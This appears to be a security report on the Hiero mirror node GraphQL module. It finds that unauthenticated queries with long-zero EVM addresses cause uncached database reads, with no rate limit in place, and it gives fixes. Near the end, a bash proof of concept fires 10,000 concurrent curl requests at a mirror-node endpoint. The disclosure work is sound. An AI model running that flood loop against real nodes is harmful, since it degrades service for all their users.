### Title
Unauthenticated GraphQL EVM Address Enumeration Causes Unbounded Uncached DB Read Load

### Summary
The GraphQL `EntityServiceImpl.getByEvmAddressAndType()` method routes any EVM address with zero shard and zero realm bytes directly to an uncached `findById()` database call. Because the GraphQL module has no rate limiting and the `EntityRepository` carries no `@Cacheable` annotation on `findById()`, an unprivileged attacker can flood the endpoint with crafted long-zero EVM addresses carrying varying `num` values, generating one uncached primary-key DB read per request with no server-side throttle to stop them.

### Finding Description

**Exact code path:**

`graphql/src/main/java/org/hiero/mirror/graphql/service/EntityServiceImpl.java`, lines 34–41:

```java
public Optional<Entity> getByEvmAddressAndType(String evmAddress, EntityType type) {
    byte[] evmAddressBytes = decodeEvmAddress(evmAddress);
    var buffer = ByteBuffer.wrap(evmAddressBytes);
    if (buffer.getInt() == 0 && buffer.getLong() == 0) {          // bytes 0-3 shard, 4-11 realm
        return entityRepository.findById(buffer.getLong())         // bytes 12-19 → DB read
                               .filter(e -> e.getType() == type);
    }
    return entityRepository.findByEvmAddress(evmAddressBytes).filter(e -> e.getType() == type);
}
```

**Root cause – two compounding absences:**

1. **No caching on `findById()`.**  
   `graphql/src/main/java/org/hiero/mirror/graphql/repository/EntityRepository.java` (lines 11–17) extends `CrudRepository<Entity, Long>` with zero `@Cacheable`/`@Caching` annotations. Every call to `findById()` issues a live SQL `SELECT` against the `entity` table. (Contrast with `web3/src/main/java/org/hiero/mirror/web3/repository/EntityRepository.java` lines 20–30, which carries `@Caching` with two `@Cacheable` entries on the equivalent method.)

2. **No rate limiting in the GraphQL module.**  
   `graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java` (lines 42–48) installs only `MaxQueryComplexityInstrumentation(200)` and `MaxQueryDepthInstrumentation(10)`. These cap the *structure* of a single query; they impose no per-second request ceiling. The bucket4j throttle (`web3/src/main/java/org/hiero/mirror/web3/config/ThrottleConfiguration.java`) is scoped entirely to the `web3` module and is never wired into the GraphQL request path.

**Exploit flow:**

An attacker sends a continuous stream of GraphQL `account` queries, each with a distinct `evmAddress` of the form `0x000000000000000000000000<N>` (12 zero bytes + 8-byte varying `num`). Each address satisfies `buffer.getInt() == 0 && buffer.getLong() == 0`, so the `findById(N)` branch is taken unconditionally. Because `N` varies per request, no JVM-level or DB-level result cache absorbs the load. Each request produces one `SELECT * FROM entity WHERE id = N` against the database.

**Why existing checks fail:**

| Check | Why insufficient |
|---|---|
| `MaxQueryComplexityInstrumentation(200)` | Limits structural complexity of one query; does not limit request rate |
| `MaxQueryDepthInstrumentation(10)` | Same — structural, not rate-based |
| GraphQL/Jackson parser limits (chars, tokens) | Reject malformed documents; a valid `account(input:{evmAddress:"0x…"})` query is tiny and well within all limits |
| No authentication | Endpoint is publicly accessible; no credential required |

### Impact Explanation

Each crafted request forces one synchronous primary-key read against the `entity` table. At sustained high request rates (easily achievable from a single host or small botnet), the aggregate read IOPS and connection-pool utilisation on the database climb proportionally. Because the `num` field spans a 64-bit space, the attacker never repeats a value, defeating any future result-level caching. The `GraphQLHighDBConnections` alert (charts/hedera-mirror-graphql/values.yaml, line 204) fires only at 75 % connection utilisation — well after the 30 % read-load threshold is crossed. Severity: **Medium** (resource exhaustion / availability degradation; no data exfiltration, but sustained attack degrades service for all users).

### Likelihood Explanation

No privileges, API keys, or special network position are required. The GraphQL endpoint is internet-facing by design. The attack payload is a trivial loop incrementing a counter in the `evmAddress` field. A single commodity machine sending ~500–1 000 HTTP/2 requests per second is sufficient to saturate a modest database instance. The attack is fully repeatable and stateless.

### Recommendation

1. **Add rate limiting to the GraphQL module.** Introduce a bucket4j (or equivalent) filter analogous to `ThrottleManagerImpl` in the `web3` module, applied at the HTTP layer before GraphQL execution.

2. **Add caching to `EntityRepository.findById()` in the graphql module.** Mirror the `@Caching`/`@Cacheable` annotations already present on the `web3` `EntityRepository` (lines 20–30). A bounded Caffeine cache with a short TTL (e.g., 5–30 s) absorbs repeated lookups for the same `num` and limits the blast radius of enumeration attacks.

3. **Validate `num` range.** Reject EVM addresses whose decoded `num` value falls outside the range of plausible entity IDs (e.g., > current max known entity ID) before issuing any DB call.

### Proof of Concept

```bash
# Requires: curl, bash
# Sends 10 000 account queries with distinct long-zero EVM addresses (no auth needed)

GRAPHQL_URL="https://<mirror-node-host>/graphql/alpha"

for i in $(seq 1 10000); do
  # Encode num as 8-byte big-endian hex, pad to 20-byte EVM address (shard=0, realm=0)
  NUM_HEX=$(printf '%016x' $i)
  EVM_ADDR="0x000000000000000000000000${NUM_HEX}"
  curl -s -o /dev/null -X POST "$GRAPHQL_URL" \
    -H 'Content-Type: application/json' \
    -d "{\"query\":\"{ account(input:{evmAddress:\\\"${EVM_ADDR}\\\"}) { id } }\"}" &
done
wait
```

Each iteration triggers `EntityServiceImpl.getByEvmAddressAndType()` → `buffer.getInt()==0 && buffer.getLong()==0` → `entityRepository.findById(i)` → uncached SQL `SELECT`. Monitor `pg_stat_activity` or the `GraphQLQueryLatency` Prometheus metric to observe the DB read spike. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** graphql/src/main/java/org/hiero/mirror/graphql/service/EntityServiceImpl.java (L34-41)
```java
    public Optional<Entity> getByEvmAddressAndType(String evmAddress, EntityType type) {
        byte[] evmAddressBytes = decodeEvmAddress(evmAddress);
        var buffer = ByteBuffer.wrap(evmAddressBytes);
        if (buffer.getInt() == 0 && buffer.getLong() == 0) {
            return entityRepository.findById(buffer.getLong()).filter(e -> e.getType() == type);
        }
        return entityRepository.findByEvmAddress(evmAddressBytes).filter(e -> e.getType() == type);
    }
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/repository/EntityRepository.java (L11-17)
```java
@GraphQlRepository
public interface EntityRepository extends CrudRepository<Entity, Long> {
    @Query(value = "select * from entity where alias = ?1 and deleted is not true", nativeQuery = true)
    Optional<Entity> findByAlias(byte[] alias);

    @Query(value = "select * from entity where evm_address = ?1 and deleted is not true", nativeQuery = true)
    Optional<Entity> findByEvmAddress(byte[] evmAddress);
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java (L42-48)
```java
    GraphQlSourceBuilderCustomizer graphQlCustomizer(PreparsedDocumentProvider provider) {
        var maxQueryComplexity = new MaxQueryComplexityInstrumentation(200);
        var maxQueryDepth = new MaxQueryDepthInstrumentation(10);
        var instrumentation = new ChainedInstrumentation(maxQueryComplexity, maxQueryDepth);

        return b -> b.configureGraphQl(
                graphQL -> graphQL.instrumentation(instrumentation).preparsedDocumentProvider(provider));
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/EntityRepository.java (L20-30)
```java
    @Caching(
            cacheable = {
                @Cacheable(cacheNames = CACHE_NAME, cacheManager = CACHE_MANAGER_ENTITY, unless = "#result == null"),
                @Cacheable(
                        cacheNames = CACHE_NAME,
                        cacheManager = CACHE_MANAGER_SYSTEM_ACCOUNT,
                        condition =
                                "#entityId < 1000 && !T(org.hiero.mirror.web3.common.ContractCallContext).isBalanceCallSafe()",
                        unless = "#result == null")
            })
    Optional<Entity> findByIdAndDeletedIsFalse(Long entityId);
```
